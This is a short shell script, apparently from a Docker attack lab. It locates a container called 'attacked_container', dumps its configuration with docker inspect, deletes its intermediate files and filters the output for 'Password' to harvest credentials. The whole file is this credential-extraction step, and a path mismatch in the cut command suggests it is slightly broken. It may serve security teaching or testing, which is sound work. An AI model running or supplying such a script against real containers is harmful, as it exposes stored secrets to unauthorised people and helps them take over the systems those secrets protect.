#!/bin/sh

docker ps | grep attacked_container > /Attack/dockerps
cut -d' ' -f1 dockerps > /Attack/containerid
container_id=$(cat /Attack/containerid)
docker inspect ${container_id} > /Attack/inspect_output

rm /Attack/dockerps
rm /Attack/containerid

cat /Attack/inspect_output | grep Password
